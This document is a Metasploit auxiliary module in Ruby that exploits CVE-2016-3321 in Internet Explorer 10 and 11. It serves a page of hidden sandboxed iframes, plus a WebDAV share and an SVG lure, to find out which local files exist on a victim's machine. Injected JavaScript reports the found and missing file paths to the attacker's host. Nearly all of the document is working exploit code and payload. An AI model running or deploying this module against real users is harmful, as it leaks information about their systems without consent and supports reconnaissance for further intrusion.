##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Internet Explorer Iframe Sandbox File Name Disclosure Vulnerability',
      'Description'    => %q{
        It was found that Internet Explorer allows the disclosure of local file names.
        This issue exists due to the fact that Internet Explorer behaves different for
        file:// URLs pointing to existing and non-existent files. When used in
        combination with HTML5 sandbox iframes it is possible to use this behavior to
        find out if a local file exists. This technique only works on Internet Explorer
        10 & 11 since these support the HTML5 sandbox. Also it is not possible to do
        this from a regular website as file:// URLs are blocked all together. The attack
        must be performed locally (works with Internet zone Mark of the Web) or from a
        share.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'Yorick Koster',
      'References'     =>
        [
          ['CVE', '2016-3321'],
          ['MSB', 'MS16-095'],
          ['URL', 'https://securify.nl/advisory/SFY20160301/internet_explorer_iframe_sandbox_local_file_name_disclosure_vulnerability.html'],
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Internet Explorer', {} ],
        ],
      'DisclosureDate' => "Aug 9 2016",
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        OptString.new('SHARENAME', [ true, "The name of the top-level share.", "falcon" ]),
        OptString.new('PATHS', [ true, "The list of files to check (comma separated).", "Testing/Not/Found/Check.txt, Windows/System32/calc.exe, Program Files (x86)/Mozilla Firefox/firefox.exe, Program Files/VMware/VMware Tools/TPAutoConnSvc.exe" ]),
      ])

    # no SSL
    deregister_options('SSL', 'SSLVersion', 'SSLCert', 'SRVPORT', 'URIPATH')
  end

  def js
    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']

    %Q|function report() {
  if(window.location.protocol != 'file:') {
    try {
      window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
    } catch (e) { }
    return;
  }

  var frames = document.getElementsByTagName('iframe');
  for(var i = 0; i < frames.length; i++) {
  try {
      if(frames[i].name == 'notfound') {
        frames[i].src = 'http://#{my_host}/notfound/?f=' + frames[i].src;
      }
      else {
        frames[i].src = 'http://#{my_host}/found/?f=' + frames[i].src;
      }
    } catch(e) { }
  }
}|
  end

  def html
    frames = ""
    datastore['PATHS'].split(',').each do |path|
      frames = frames + "<iframe src=\"file:///#{path.strip}\" onload=\"this.name='notfound'\" style=\"display:none;\" sandbox></iframe>"
    end

    %Q|<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">
#{js}
</script>
</head>
<body>
#{frames}
<script type="text/javascript">
  setTimeout('report();', 2000);
</script>
</body>
</html>|
  end

  def svg
    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']

    %Q|<!-- saved from url=(0014)about:internet -->
<svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
  end

  def is_target_suitable?(user_agent)
    if user_agent =~ /^Microsoft-WebDAV-MiniRedir/
      return true
    end

    info = fingerprint_user_agent(user_agent)
    if info[:ua_name] == HttpClients::IE
      return true
    end

    false
  end

  def on_request_uri(cli, request)
    my_host  = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']

    case request.method
    when 'OPTIONS'
      process_options(cli, request)
    when 'PROPFIND'
      process_propfind(cli, request)
    when 'GET'
      unless is_target_suitable?(request.headers['User-Agent'])
        print_status("GET #{request.uri} #{request.headers['User-Agent']} => 200 image.svg")
        resp = create_response(200, "OK")
        resp.body = svg
        resp['Content-Type'] = 'image/svg+xml'
        resp['Content-Disposition'] = 'attachment;filename=image.svg'
        cli.send_response(resp)
      end

      case request.uri
      when /^\/found\/\?f=/
        f = URI.unescape(request.uri.gsub('/found/?f=', ''))
        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)
        print_good("Found file " + f)
        send_response(cli, '')
      when /^\/notfound\/\?f=/
        f = URI.unescape(request.uri.gsub('/notfound/?f=', ''))
        print_error("The file " + f + " does not exist")
        send_response(cli, '')
      when "/"
        resp = create_response(200, "OK")
        resp.body = %Q|<html>
<head>
<script type="text/javascript">
  try {
    window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
  } catch (e) {
    blob = new Blob([atob('#{Rex::Text.encode_base64(svg)}')]);
    window.navigator.msSaveOrOpenBlob(blob, 'image.svg');
  }
</script>
</head>
<body>
</body>
</html>|

        resp['Content-Type'] = 'text/html'
        cli.send_response(resp)
      else
        print_status("GET #{request.uri} #{request.headers['User-Agent']} => 200 returning landing page")
        send_response(cli, html)
      end
    else
      print_status("#{request.method} #{request.uri} => 404")
      resp = create_response(404, "Not Found")
      resp.body = ""
      resp['Content-Type'] = 'text/html'
      cli.send_response(resp)
    end
  end

  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request)
    print_status("OPTIONS #{request.uri}")
    headers = {
      'MS-Author-Via' => 'DAV',
      'DASL'          => '<DAV:sql>',
      'DAV'           => '1, 2',
      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
      'Cache-Control' => 'private'
    }

    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request)
    path = request.uri
    print_status("PROPFIND #{path}")
    body = ''

    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
    my_uri = "http://#{my_host}/"

    if path !~ /\/$/

      if path.index(".")
        print_status "PROPFIND => 207 File (#{path})"
        body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
        # send the response
        resp = create_response(207, "Multi-Status")
        resp.body = body
        resp['Content-Type'] = 'text/xml; charset="utf8"'
        cli.send_response(resp)
        return
      else
        print_status "PROPFIND => 301 (#{path})"
        resp = create_response(301, "Moved")
        resp["Location"] = path + "/"
        resp['Content-Type'] = 'text/html'
        cli.send_response(resp)
        return
      end
    end

    print_status "PROPFIND => 207 Directory (#{path})"
    body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|

    if request["Depth"].to_i > 0
      trail = path.split("/")
      trail.shift
      case trail.length
      when 0
        body << generate_shares(path)
      when 1
        body << generate_files(path)
      end
    else
      print_status "PROPFIND => 207 Top-Level Directory"
    end

    body << "</D:multistatus>"

    body.gsub!(/\t/, '')

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml; charset="utf8"'
    cli.send_response(resp)
  end

  def generate_shares(path)
    share_name = datastore['SHARENAME']
%Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end

  def generate_files(path)
    trail = path.split("/")
    return "" if trail.length < 2

    %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}index.html</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
  end

  def gen_timestamp(ttype=nil)
    ::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
  end

  def gen_datestamp(ttype=nil)
    ::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
  end

  def run
    datastore['URIPATH'] = '/'
    datastore['SRVPORT'] = 80
    exploit
  end
end
